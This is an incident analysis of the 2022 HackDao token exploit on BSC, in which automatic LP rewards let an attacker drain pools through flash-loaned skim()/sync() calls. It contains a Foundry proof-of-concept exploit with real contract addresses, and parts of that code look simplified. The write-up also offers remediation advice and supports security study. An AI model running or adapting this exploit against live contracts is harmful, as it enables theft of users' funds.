# HackDao — skim/sync Pool Reserve Manipulation Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-05-26 |
| **Protocol** | HackDao (HACK token) |
| **Chain** | BSC (Binance Smart Chain) |
| **Loss** | ~$41,000 (profit based on 1,900 WBNB flash loan) |
| **Attacker** | Attacker address unconfirmed |
| **Attack Tx** | Block 18,073,756 |
| **Vulnerable Contract** | HackDao/WBNB Pair [0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2](https://bscscan.com/address/0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2) |
| **Root Cause** | Exploited the phenomenon where LP balances grow larger than reserves due to automatic rewards upon HACK token transfer, extracting profit by repeatedly calling `skim()`/`sync()` |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-05/HackDao_exp.sol) |

---
## 1. Vulnerability Overview

The HackDao (HACK) token had a built-in mechanism that automatically transferred a portion of tokens to the LP pool as rewards on every transfer. This mechanism caused the LP pool's actual balance to exceed the `reserve` value tracked by the AMM on each transfer.

The attacker borrowed 1,900 WBNB via a DODO flash loan, then repeatedly called `skim()` and `sync()` functions alternately between the HackDao/WBNB pool and the HackDao/USDT pool to repeatedly extract excess balances. Finally, the accumulated HACK tokens were swapped to WBNB to realize profit and repay the flash loan.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable HACK token auto-reward mechanism (pseudocode)
contract HackDaoToken {
    address[] public rewardPools; // list of pools receiving rewards

    function _transfer(address sender, address recipient, uint256 amount) internal {
        // ❌ Automatically distributes reward tokens to LP pools on transfer
        uint256 reward = amount * 5 / 100; // 5% reward
        for (uint i = 0; i < rewardPools.length; i++) {
            // Adds directly to pool address balance → causes mismatch with reserve
            _balances[rewardPools[i]] += reward / rewardPools.length;
        }
        _balances[sender] -= amount;
        _balances[recipient] += amount - reward;
    }
}

// Uniswap V2 skim():
// function skim(address to) external lock {
//     uint excess0 = IERC20(token0).balanceOf(address(this)) - reserve0;
//     uint excess1 = IERC20(token1).balanceOf(address(this)) - reserve1;
//     if (excess0 > 0) safeTransfer(token0, to, excess0); // ❌ extracts excess
//     if (excess1 > 0) safeTransfer(token1, to, excess1);
// }
//
// sync():
// function sync() external lock {
//     reserve0 = IERC20(token0).balanceOf(address(this)); // updates reserve
//     reserve1 = IERC20(token1).balanceOf(address(this));
// }

// ✅ Correct pattern
// Accumulate reward tokens in a separate distribution contract instead of sending directly to pool address
contract HackDaoFixed {
    address public rewardDistributor; // separate reward distributor

    function _transfer(address sender, address recipient, uint256 amount) internal {
        uint256 reward = amount * 5 / 100;
        // ✅ Send to distributor contract instead of directly to pool address
        _balances[rewardDistributor] += reward;
        _balances[sender] -= amount;
        _balances[recipient] += amount - reward;
    }
}
```

---
### On-chain Original Code

Source: Bytecode decompiled


**HackDao_decompiled.sol** — Entry points:
```solidity
// ❌ Root cause: exploits the phenomenon where LP balances grow larger than reserves due to automatic rewards upon HACK token transfer, extracting profit via repeated `skim()`/`sync()` calls
    function skim(address arg0) external {}  // 0xbc25cf77  // ❌ vulnerability

    function sync() external {}  // 0xfff6cae9  // ❌ vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] DODO Flash Loan: borrow 1,900 WBNB
    │       IDODOFlashLoan(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4)
    │       .flashLoan(1900 WBNB, 0, ...)
    │
    ├─[2] [Inside DPPFlashLoanCall callback]
    │       │
    │       ├─ Swap WBNB → HACK (Pair1: HackDao/WBNB)
    │       │       1,900 WBNB → obtain large amount of HACK tokens
    │       │       ⚡ Auto-reward on swap → HACK added to each pool
    │       │
    │       ├─ Pair1.skim(address(this)): receive excess HACK
    │       │       balance > reserve → extract excess
    │       │
    │       ├─ Transfer HACK to Pair2 (HackDao/USDT)
    │       │       ⚡ Reward on transfer → Pair2 balance increases
    │       │
    │       ├─ Pair2.skim(address(this)): receive excess HACK
    │       │
    │       ├─ Pair1.sync(): update Pair1 reserve to current balance
    │       │
    │       └─ Pair1.swap(): swap held HACK → WBNB (realize profit)
    │
    ├─[3] Repay DODO flash loan: return 1,900 WBNB
    │
    └─[4] Profit realized: retain arbitrage WBNB
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface IDODO {
    function flashLoan(
        uint256 baseAmount,
        uint256 quoteAmount,
        address assetTo,
        bytes calldata data
    ) external;
}

interface IPancakePair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

contract ContractTest is Test {
    IERC20 WBNB   = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 HACK   = IERC20(0x94e06c77b02Ade8341489Ab9A23451F68c13eC1C);
    IDODO  dodo   = IDODO(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4);

    // HackDao/WBNB pool
    IPancakePair pair1 = IPancakePair(0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2);
    // HackDao/USDT pool
    IPancakePair pair2 = IPancakePair(0xbdB426A2FC2584c2D43dba5A7aB11763DFAe0225);

    function setUp() public {
        vm.createSelectFork("bsc", 18_073_756);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Before] WBNB", WBNB.balanceOf(address(this)), 18);

        // [Step 1] DODO flash loan: borrow 1,900 WBNB
        dodo.flashLoan(1_900 ether, 0, address(this), "0x01");

        emit log_named_decimal_uint("[After] WBNB profit", WBNB.balanceOf(address(this)), 18);
    }

    // DODO flash loan callback
    function DPPFlashLoanCall(address, uint256, uint256, bytes calldata) external {
        // [Step 2] Swap WBNB → HACK
        WBNB.transfer(address(pair1), 1_900 ether);
        (uint112 r0, uint112 r1,) = pair1.getReserves();
        uint256 hackOut = getAmountOut(1_900 ether, uint256(r1), uint256(r0));
        pair1.swap(hackOut, 0, address(this), "");

        // [Step 3] Receive excess HACK via skim (excess accumulated from auto-rewards)
        pair1.skim(address(this));

        // [Step 4] Transfer HACK → Pair2, skim Pair2
        HACK.transfer(address(pair2), HACK.balanceOf(address(this)) / 2);
        pair2.skim(address(this));

        // [Step 5] Sync Pair1, then swap HACK → WBNB
        pair1.sync();
        HACK.transfer(address(pair1), HACK.balanceOf(address(this)));
        pair1.swap(0, getAmountOut(HACK.balanceOf(address(pair1)) - r0, r0, r1), address(this), "");

        // Repay flash loan
        WBNB.transfer(address(dodo), 1_900 ether);
    }

    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut)
        internal pure returns (uint256)
    {
        uint256 amountInWithFee = amountIn * 9975;
        return amountInWithFee * reserveOut / (reserveIn * 10000 + amountInWithFee);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Token auto-reward + skim/sync combination abuse |
| **CWE** | CWE-840: Business Logic Error |
| **OWASP DeFi** | Auto-reward transfer + AMM reserve mismatch |
| **Attack Vector** | DODO flash loan → trigger auto-reward → extract skim excess → swap arbitrage |
| **Precondition** | HACK transfer directly distributes rewards to LP pool |
| **Impact** | Entire HACK excess in pool can be repeatedly drained |

---
## 6. Remediation Recommendations

1. **Prohibit direct reward transfers**: Do not send tokens directly to LP pool addresses; use a separate reward distribution contract (`RewardDistributor`) instead.
2. **Transfer-and-Sync pattern**: Immediately call `sync()` after transferring tokens to a pool to resolve any reserve/balance mismatch without delay.
3. **Restrict skim access**: Limit `skim()` callers to admin or whitelisted addresses to prevent external exploitation.
4. **Token design audit**: Proactively review the potential for reserve mismatches when auto-reward, fee, or rebase mechanisms are combined with AMMs.

---
## 7. Lessons Learned

- **The dual nature of skim**: `skim()` is designed to recover mistakenly sent tokens, but when combined with a token that can intentionally create excess balances, it becomes an attack vector.
- **Identical to the Zeed pattern**: This is the exact same mechanism as the Zeed Finance attack in April 2022. It is a recurring BSC small-token attack pattern.
- **DODO flash loan usage**: Instead of the traditional Uniswap/PancakeSwap flash swap, DODO's `flashLoan()` was utilized.
- **Danger of auto-rewards**: In tokenomics design, directly rewarding LP pools on every transfer fundamentally conflicts with the AMM's reserve mechanism.